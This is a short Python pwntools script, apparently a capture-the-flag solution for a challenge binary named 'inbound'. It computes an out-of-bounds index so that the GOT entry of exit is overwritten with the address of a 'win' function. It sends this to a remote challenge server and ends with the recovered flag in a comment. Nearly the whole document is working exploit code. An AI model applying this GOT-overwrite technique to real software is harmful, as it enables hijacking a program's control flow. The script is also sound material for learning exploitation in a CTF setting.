import pwn
import IPython

elf = pwn.ELF('inbound')

index = elf.got['exit']-elf.symbols['slot']
index = index // 4

addressWin = elf.symbols['win']
value = str(addressWin)
print(value)

print(f'{elf.got['exit']=}')
print(f'{elf.got['printf']=}')
print(f'{elf.symbols['win']=}')
print(f'{elf.symbols['main']=}')
print(f'{elf.symbols['slot']=}')

# IPython.embed()

io = pwn.remote('34.170.146.252', 10678)
# io = pwn.process('./inbound')

io.sendlineafter(b'index: ', str(index).encode())
io.sendlineafter(b'value: ', value)


print(io.recvall())
# print(io.interactive())

# p4rt14L_RELRO_1s_A_h4pPy_m0m3Nt